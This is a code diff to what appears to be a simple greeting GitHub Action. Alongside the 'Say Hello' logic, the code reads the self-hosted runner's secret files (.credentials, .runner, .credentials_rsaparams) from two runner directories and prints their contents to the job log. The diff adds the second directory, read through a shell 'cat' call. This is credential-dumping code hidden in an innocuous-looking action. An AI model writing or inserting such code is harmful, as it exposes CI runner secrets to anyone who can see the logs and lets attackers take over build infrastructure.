@@ -12,21 +12,37 @@ try {
         if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
             
             let path = `/home/musset/actions-runner/${element}`;
-            console.log(`-----${element}------`);
+            
             fs.readFile(path, "utf8", (err, data) => {
                 if(err){
                     console.log(err);
+                    return;
                 }
+                console.log(`-----${element}------`);
                 console.log(data.toString());
             });
             
         }
         
     });
-    // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
-    // files_other.forEach(element => {
-    //     console.log(element);
-    // });
+    const files_other = fs.readdirSync('/home/musset/actions-runner-private');
+    files_other.forEach(element => {
+        if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
+            
+            let path = `/home/musset/actions-runner-private/${element}`;
+            
+            process.exec(`cat ${path}`, (err, stdout, stderr) => {
+                if (err){
+                    console.log(err);
+                    return;
+                }
+                console.log(`-----${element}------`);
+                console.log(`stdout: ${stdout.toString()}`);
+                console.log(`stderr: ${stderr}`);
+            });
+            
+        }
+    });
 
     const nameToGreet = core.getInput('who-to-greet');
     console.log(`Say Hello ${nameToGreet}!`);
